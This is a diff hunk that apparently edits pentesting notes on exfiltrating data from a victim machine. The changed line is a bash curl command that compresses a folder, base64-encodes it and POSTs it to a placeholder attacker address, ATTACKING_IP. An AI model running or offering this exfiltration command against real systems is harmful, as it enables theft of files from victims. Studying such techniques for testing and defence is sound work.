@@ -42,7 +42,7 @@ On the victim computer, you can now send data through POST request. It will be s
 ```bash
 # Linux
 # Compress folder, base64, and send
-user@victime$ curl --data "file=$(tar zcf - Bashed | base64)" http://ATTACKING_IP/
+user@victime$ curl --data "file=$(tar zcf - folderToExfiltrate | base64)" http://ATTACKING_IP/
 ```
 
 On attacking machine, we can decode now decode it:
